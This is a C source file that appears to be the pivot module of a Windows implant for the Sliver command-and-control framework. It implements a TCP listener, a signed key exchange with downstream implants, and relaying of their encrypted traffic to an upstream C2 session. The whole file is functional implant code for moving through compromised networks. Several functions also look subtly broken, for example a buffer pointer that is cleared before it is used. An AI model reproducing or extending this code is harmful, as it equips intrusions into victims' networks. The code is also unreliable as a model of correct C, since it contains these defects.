#include "pch.h"

PBUFFER MarshalPivotHello
(
	_In_ PGLOBAL_CONFIG pGlobalConfig,
	_In_ PBUFFER pSessionKey
)
{
	PPBElement Elements[4];
	PPBElement pFinalElement = NULL;
	PBUFFER pResult = NULL;

	SecureZeroMemory(Elements, sizeof(Elements));
	Elements[0] = CreateBytesElement(pGlobalConfig->lpPeerPubKey, lstrlenA(pGlobalConfig->lpPeerPubKey), 1);
	Elements[1] = CreateVarIntElement(pGlobalConfig->uPeerID, 2);
	Elements[2] = CreateBytesElement(pGlobalConfig->lpPeerAgePublicKeySignature, lstrlenA(pGlobalConfig->lpPeerAgePublicKeySignature), 3);
	if (pSessionKey != NULL) {
		Elements[3] = CreateBytesElement(pSessionKey->pBuffer, pSessionKey->cbBuffer, 4);
	}

	pFinalElement = CreateStructElement(Elements, _countof(Elements), 0);
	pResult = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
	pFinalElement->pMarshaledData = NULL;
	FreeElement(pFinalElement);

	return pResult;
}

PPIVOT_HELLO UnmarshalPivotHello
(
	PBUFFER pInput
)
{
	PPBElement Elements[4];
	PPIVOT_HELLO pResult = NULL;
	DWORD i = 0;
	LPVOID* UnmarshaledData = NULL;

	for (i = 0; i < _countof(Elements); i++) {
		Elements[i] = ALLOC(sizeof(PBElement));
		Elements[i]->dwFieldIdx = i + 1;
		Elements[i]->Type = Bytes;
	}

	Elements[1]->Type = Varint;
	UnmarshaledData = UnmarshalStruct(Elements, _countof(Elements), pInput->pBuffer, pInput->cbBuffer, NULL);
	pResult = ALLOC(sizeof(PIVOT_HELLO));
	pResult->pPublicKey = (PBUFFER)UnmarshaledData[0];
	pResult->uPeerID = (UINT64)UnmarshaledData[1];
	pResult->lpPublicKeySignature = DuplicateStrA(((PBUFFER)UnmarshaledData[2])->pBuffer, 0);
	pResult->pSessionKey = (PBUFFER)UnmarshaledData[3];

	if (UnmarshaledData != NULL) {
		FreeBuffer((PBUFFER)UnmarshaledData[2]);
		FREE(UnmarshaledData);
	}

	return pResult;
}

PPIVOT_PEER_ENVELOPE UnmarshalPivotPeerEnvelope
(
	_In_ PBUFFER pInput
)
{
	PPBElement PivotPeerEnvelopeElement[5];
	PPBElement PivotPeerElement[2];
	LPVOID* UnmarshaledData = NULL;
	LPVOID* UnmarshaledPivotPeer = NULL;
	DWORD i = 0;
	PPIVOT_PEER_ENVELOPE pResult = NULL;
	PBUFFER pTempBuffer = NULL;

	SecureZeroMemory(PivotPeerEnvelopeElement, sizeof(PivotPeerEnvelopeElement));
	for (i = 0; i < _countof(PivotPeerEnvelopeElement); i++) {
		PivotPeerEnvelopeElement[i] = ALLOC(sizeof(PBElement));
		PivotPeerEnvelopeElement[i]->dwFieldIdx = i + 1;
	}

	PivotPeerEnvelopeElement[0]->Type = RepeatedBytes;
	PivotPeerEnvelopeElement[1]->Type = Varint;
	PivotPeerEnvelopeElement[2]->Type = Bytes;
	PivotPeerEnvelopeElement[3]->Type = Bytes;
	PivotPeerEnvelopeElement[4]->Type = Varint;
	UnmarshaledData = UnmarshalStruct(PivotPeerEnvelopeElement, _countof(PivotPeerEnvelopeElement), pInput->pBuffer, pInput->cbBuffer, NULL);
	if (UnmarshaledData == NULL) {
		goto CLEANUP;
	}

	pResult = ALLOC(sizeof(PIVOT_PEER_ENVELOPE));
	pResult->pPivotSessionID = (PBUFFER)UnmarshaledData[2];
	UnmarshaledData[2] = NULL;

	pResult->pData = (PBUFFER)UnmarshaledData[3];
	UnmarshaledData[3] = NULL;

	pResult->uType = (UINT64)UnmarshaledData[1];
	pResult->PeerFailureAt = (UINT64)UnmarshaledData[4];
	if (UnmarshaledData[0] != NULL) {
		SecureZeroMemory(PivotPeerElement, sizeof(PivotPeerElement));
		PivotPeerElement[0] = ALLOC(sizeof(PBElement));
		PivotPeerElement[0]->dwFieldIdx = 1;
		PivotPeerElement[0]->Type = Varint;

		PivotPeerElement[1] = ALLOC(sizeof(PBElement));
		PivotPeerElement[1]->dwFieldIdx = 2;
		PivotPeerElement[1]->Type = Bytes;

		pResult->cPivotPeers = *(PUINT64)(UnmarshaledData[0]);
		pResult->PivotPeers = ALLOC(sizeof(PPIVOT_PEER) * pResult->cPivotPeers);
		for (i = 0; i < pResult->cPivotPeers; i++) {
			pTempBuffer = ((PBUFFER*)(UnmarshaledData[0]))[i + 1];
			UnmarshaledPivotPeer = UnmarshalStruct(PivotPeerElement, _countof(PivotPeerElement), pTempBuffer->pBuffer, pTempBuffer->cbBuffer, NULL);
			pResult->PivotPeers[i] = ALLOC(sizeof(PIVOT_PEER));
			pResult->PivotPeers[i]->lpName = DuplicateStrA(((PBUFFER)UnmarshaledPivotPeer[1])->pBuffer, 0);
			pResult->PivotPeers[i]->uPeerID = (UINT64)UnmarshaledPivotPeer[0];

			FreeBuffer((PBUFFER)UnmarshaledPivotPeer[1]);
			FREE(UnmarshaledPivotPeer);
			FreeBuffer(pTempBuffer);
		}

		FREE(UnmarshaledData[0]);
	}

CLEANUP:
	for (i = 0; i < _countof(PivotPeerEnvelopeElement); i++) {
		FreeElement(PivotPeerEnvelopeElement[i]);
	}

	for (i = 0; i < _countof(PivotPeerElement); i++) {
		FreeElement(PivotPeerElement[i]);
	}

	FREE(UnmarshaledData);

	return pResult;
}


VOID FreePivotListener
(
	_In_ PPIVOT_LISTENER pListener
)
{
	DWORD i = 0;
	PPIVOT_CONNECTION pConnection = NULL;

	if (pListener != NULL) {
		pListener->IsExiting = TRUE;
		if (pListener->dwType == PivotType_TCP) {
			closesocket((SOCKET)pListener->ListenHandle);
		}

		if (pListener->hThread != NULL) {
			WaitForSingleObject(pListener->hThread, INFINITE);
			CloseHandle(pListener->hThread);
		}
		
		FREE(pListener->lpBindAddress);
		FREE(pListener->Connections);
		DeleteCriticalSection(&pListener->Lock);
		FREE(pListener);
	}
}

PBUFFER MarshalPivotPeerEnvelope
(
	_In_ PPIVOT_PEER_ENVELOPE pEnvelope
)
{
	PBUFFER pResult = NULL;
	PPBElement pFinalElement = NULL;
	PPBElement PivotPeerEnvelopeElement[5];
	PPBElement PivotPeerElement[2];
	DWORD i = 0;
	PPBElement* ElementList = NULL;

	SecureZeroMemory(PivotPeerEnvelopeElement, sizeof(PivotPeerEnvelopeElement));
	PivotPeerEnvelopeElement[1] = CreateVarIntElement(pEnvelope->uType, 2);
	if (pEnvelope->pData != NULL) {
		PivotPeerEnvelopeElement[3] = CreateBytesElement(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, 4);
	}

	if (pEnvelope->pPivotSessionID != NULL) {
		PivotPeerEnvelopeElement[2] = CreateBytesElement(pEnvelope->pPivotSessionID->pBuffer, pEnvelope->pPivotSessionID->cbBuffer, 3);
	}

	PivotPeerEnvelopeElement[4] = CreateVarIntElement(pEnvelope->PeerFailureAt, 5);
	if (pEnvelope->PivotPeers != NULL) {
		ElementList = ALLOC(sizeof(PPBElement) * pEnvelope->cPivotPeers);
		for (i = 0; i < pEnvelope->cPivotPeers; i++) {
			PivotPeerElement[0] = CreateVarIntElement(pEnvelope->PivotPeers[i]->uPeerID, 1);
			PivotPeerElement[1] = CreateBytesElement(pEnvelope->PivotPeers[i]->lpName, lstrlenA(pEnvelope->PivotPeers[i]->lpName), 2);
			ElementList[i] = CreateStructElement(PivotPeerElement, _countof(PivotPeerElement), 0);
		}

		PivotPeerEnvelopeElement[0] = CreateRepeatedStructElement(ElementList, pEnvelope->cPivotPeers, 1);
		FREE(ElementList);
	}

	pFinalElement = CreateStructElement(PivotPeerEnvelopeElement, _countof(PivotPeerEnvelopeElement), 0);
	pResult = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
	pFinalElement->pMarshaledData = NULL;

	FreeElement(pFinalElement);

	return pResult;
}

VOID FreePivotPeerEnvelope
(
	_In_ PPIVOT_PEER_ENVELOPE pEnvelope
)
{
	DWORD i = 0;
	PPIVOT_PEER pPivotPeer = NULL;

	if (pEnvelope != NULL) {
		FreeBuffer(pEnvelope->pPivotSessionID);
		FreeBuffer(pEnvelope->pData);
		for (i = 0; i < pEnvelope->cPivotPeers; i++) {
			pPivotPeer = pEnvelope->PivotPeers[i];
			FREE(pPivotPeer->lpName);
			FREE(pPivotPeer);
		}

		FREE(pEnvelope->PivotPeers);
	}
}

VOID FreePivotHello
(
	_In_ PPIVOT_HELLO pPivotHello
)
{
	if (pPivotHello != NULL) {
		FreeBuffer(pPivotHello->pPublicKey);
		FreeBuffer(pPivotHello->pSessionKey);
		FREE(pPivotHello->lpPublicKeySignature);
		FREE(pPivotHello);
	}
}

PBUFFER AgeDecryptFromPeer
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ PBUFFER pSenderPublicKey,
	_In_ LPSTR lpSenderPublicKeySig,
	_In_ PBUFFER pCiphertext
)
{
	if (!MinisignVerify(pSenderPublicKey, lpSenderPublicKeySig, pConfig->lpServerMinisignPublicKey)) {
		return NULL;
	}

	return AgeDecrypt(pConfig->lpPeerPrivKey, pCiphertext);
}

PBUFFER AgeEncryptToPeer
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ PBUFFER pRecipientPublicKey,
	_In_ LPSTR lpRecipientPublicKeySig,
	_In_ PBUFFER pPlaintext
)
{
	PBUFFER pResult = NULL;
	PBYTE pCiphertext = NULL;
	DWORD cbCiphertext = 0;

	if (!MinisignVerify(pRecipientPublicKey, lpRecipientPublicKeySig, pConfig->lpServerMinisignPublicKey)) {
		return NULL;
	}

	pCiphertext = AgeEncrypt(pRecipientPublicKey->pBuffer, pPlaintext->pBuffer, pPlaintext->cbBuffer, &cbCiphertext);
	pResult = ALLOC(sizeof(BUFFER));
	pResult->pBuffer = pCiphertext;
	pResult->cbBuffer = cbCiphertext;
	return pResult;
}

BOOL PeerKeyExchange
(
	_In_ PPIVOT_CONNECTION pConnection
)
{
	LPVOID lpClient = NULL;
	PBUFFER pPeerHelloRaw = NULL;
	PPIVOT_HELLO pPivotHello = NULL;
	BOOL Result = FALSE;
	PGLOBAL_CONFIG pConfig = NULL;
	PBYTE pSessionKey = NULL;
	BUFFER TempBuffer;
	PBUFFER pCiphertext = NULL;
	PBUFFER MarshaledPivotHello = NULL;

	lpClient = pConnection->lpDownstreamConn;
	pConfig = pConnection->pListener->pConfig;
	pPeerHelloRaw = pConnection->pListener->RawRecv(lpClient);
	if (pPeerHelloRaw == NULL) {
		goto CLEANUP;
	}

	pPivotHello = UnmarshalPivotHello(pPeerHelloRaw);
	if (!MinisignVerify(pPivotHello->pPublicKey, pPivotHello->lpPublicKeySignature, pConfig->lpServerMinisignPublicKey)) {
		goto CLEANUP;
	}

	pConnection->uDownstreamPeerID = pPivotHello->uPeerID;
	pSessionKey = GenRandomBytes(CHACHA20_KEY_SIZE);
	memcpy(pConnection->SessionKey, pSessionKey, sizeof(pConnection->SessionKey));
	TempBuffer.pBuffer = pSessionKey;
	TempBuffer.cbBuffer = CHACHA20_KEY_SIZE;
	pCiphertext = AgeEncryptToPeer(pConfig, pPivotHello->pPublicKey, pPivotHello->lpPublicKeySignature, &TempBuffer);
	MarshaledPivotHello = MarshalPivotHello(pConfig, pCiphertext);
	if (!pConnection->pListener->RawSend(lpClient, MarshaledPivotHello)) {
		goto CLEANUP;
	}

	Result = TRUE;
CLEANUP:
	FreeBuffer(pPeerHelloRaw);
	FreeBuffer(pCiphertext);
	FreeBuffer(MarshaledPivotHello);
	FreePivotHello(pPivotHello);
	FREE(pSessionKey);

	return Result;
}

VOID FreePivotConnection
(
	_In_ PPIVOT_CONNECTION pConnection
)
{
	if (pConnection != NULL) {
		FREE(pConnection->lpRemoteAddress);
		FREE(pConnection);
	}
}

BOOL WriteEnvelopeToPeer
(
	_In_ PPIVOT_CONNECTION pConnection,
	_In_ PENVELOPE pEnvelope
)
{
	PBUFFER pMarshaledEnvelope = NULL;
	PBUFFER pCiphertext = NULL;
	BOOL Result = FALSE;
	PPIVOT_LISTENER pListener = NULL;

	pMarshaledEnvelope = MarshalEnvelope(pEnvelope);
	pCiphertext = SliverEncrypt(pConnection->SessionKey, pMarshaledEnvelope);
	pListener = pConnection->pListener;
	Result = pListener->RawSend(pConnection->lpDownstreamConn, pCiphertext);
CLEANUP:
	FreeBuffer(pMarshaledEnvelope);
	FreeBuffer(pCiphertext);

	return Result;
}

PENVELOPE ReadEnvelopeFromPeer
(
	_In_ PPIVOT_CONNECTION pConnection
)
{
	PPIVOT_LISTENER pListener = NULL;
	PBUFFER pCiphertext = NULL;
	PBUFFER pPlaintext = NULL;
	PENVELOPE pResult = NULL;

	pListener = pConnection->pListener;
	pCiphertext = pListener->RawRecv(pConnection->lpDownstreamConn);
	if (pCiphertext == NULL) {
		goto CLEANUP;
	}

	pPlaintext = SliverDecrypt(pConnection->SessionKey, pCiphertext);
	if (pPlaintext == NULL) {
		goto CLEANUP;
	}

	pResult = UnmarshalEnvelope(pPlaintext);
CLEANUP:
	FreeBuffer(pCiphertext);

	return pResult;
}

VOID PivotConnectionStart
(
	_In_ PPIVOT_CONNECTION pConnection
)
{
	PPIVOT_LISTENER pListener = NULL;
	PGLOBAL_CONFIG pConfig = NULL;
	PENVELOPE pEnvelope = NULL;
	PENVELOPE pSendEnvelope = NULL;
	PPIVOT_PEER_ENVELOPE pPeerEnvelope = NULL;
	PPIVOT_PEER pNewPeer = NULL;
	PSLIVER_SESSION_CLIENT pSessionClient = NULL;

	if (!PeerKeyExchange(pConnection)) {
		goto CLEANUP;
	}

	pListener = pConnection->pListener;
	pConfig = pListener->pConfig;
	EnterCriticalSection(&pListener->Lock);
	if (pListener->Connections == NULL) {
		pListener->Connections = ALLOC(sizeof(PPIVOT_CONNECTION));
	}
	else {
		pListener->Connections = REALLOC(pListener->Connections, sizeof(PPIVOT_CONNECTION) * (pListener->dwNumberOfConnections + 1));
	}

	pListener->Connections[pListener->dwNumberOfConnections++] = pConnection;
	LeaveCriticalSection(&pListener->Lock);
	while (TRUE) {
		if (pListener->IsExiting) {
			goto CLEANUP;
		}

		if (pEnvelope != NULL) {
			FreeEnvelope(pEnvelope);
			pEnvelope = NULL;
		}

		pEnvelope = ReadEnvelopeFromPeer(pConnection);
		if (pEnvelope == NULL) {
			continue;
		}

		if (pEnvelope->uType == MsgPivotPeerPing) {
			pSendEnvelope = ALLOC(sizeof(ENVELOPE));
			pSendEnvelope->uType = MsgPivotPeerPing;
			pSendEnvelope->pData = pEnvelope->pData;
			pEnvelope->pData = NULL;
			WriteEnvelopeToPeer(pConnection, pSendEnvelope);
			FreeEnvelope(pSendEnvelope);
			//= MarshalEnvelope()
		}
		else if (pEnvelope->uType == MsgPivotPeerEnvelope) {
			pPeerEnvelope = UnmarshalPivotPeerEnvelope(pEnvelope->pData);
			if (pPeerEnvelope == NULL) {
				continue;
			}

			pPeerEnvelope->PivotPeers = REALLOC(pPeerEnvelope->PivotPeers, sizeof(PPIVOT_PEER) * (pPeerEnvelope->cPivotPeers + 1));
			pNewPeer = ALLOC(sizeof(PIVOT_PEER));
			pNewPeer->lpName = DuplicateStrA(pConfig->szSliverName, 0);
			pNewPeer->uPeerID = pConfig->uPeerID;
			pPeerEnvelope->PivotPeers[pPeerEnvelope->cPivotPeers++] = pNewPeer;

			pSendEnvelope = ALLOC(sizeof(ENVELOPE));
			pSendEnvelope->uType = MsgPivotPeerEnvelope;
			pSendEnvelope->pData = MarshalPivotPeerEnvelope(pPeerEnvelope);
			pSessionClient = (PSLIVER_SESSION_CLIENT)pListener->lpUpstream;
			pSessionClient->Send(pConfig, pSessionClient->lpClient, pSendEnvelope);
			FreeEnvelope(pSendEnvelope);
			FreePivotPeerEnvelope(pPeerEnvelope);
		}
	}

CLEANUP:
	if (pEnvelope != NULL) {
		FreeEnvelope(pEnvelope);
		pEnvelope = NULL;
	}

	FreePivotConnection(pConnection);

	return;
}

VOID ListenerMainLoop
(
	_In_ PPIVOT_LISTENER pListener
)
{
	PPIVOT_CONNECTION pNewConnection = NULL;
	HANDLE hThreads[0x400];
	SOCKET Sockets[0x400];
	DWORD dwNumberOfThreads = 0;
	DWORD i = 0;

	SecureZeroMemory(hThreads, sizeof(hThreads));
	while (TRUE) {
		if (pListener->IsExiting) {
			break;
		}

		pNewConnection = pListener->Accept(pListener);
		if (pNewConnection == NULL) {
			continue;
		}

		if (pListener->dwType == PivotType_TCP) {
			Sockets[dwNumberOfThreads] = ((PSLIVER_TCP_CLIENT)pNewConnection->lpDownstreamConn)->Sock;
		}

		hThreads[dwNumberOfThreads++] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PivotConnectionStart, (LPVOID)pNewConnection, 0, NULL);
	}

	for (i = 0; i < dwNumberOfThreads; i++) {
		if (pListener->dwType == PivotType_TCP) {
			closesocket(Sockets[i]);
		}
	}

	WaitForMultipleObjects(dwNumberOfThreads, hThreads, TRUE, INFINITE);

}

PBUFFER MarshalPivotPeerFailure
(
	_In_ UINT64 uPeerID,
	_In_ PeerFailureType FailureType,
	_In_ LPSTR lpError
)
{
	PPBElement ElementList[3];
	DWORD i = 0;
	PPBElement pFinalElement = NULL;
	PBUFFER pResult = NULL;

	ElementList[0] = CreateVarIntElement(uPeerID, 1);
	ElementList[1] = CreateVarIntElement(FailureType, 2);
	ElementList[2] = CreateBytesElement(lpError, lstrlenA(lpError), 3);
	pFinalElement = CreateStructElement(ElementList, _countof(ElementList), 0);
	pFinalElement->pMarshaledData = NULL;

	pResult = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
	FreeElement(pFinalElement);

	return pResult;
}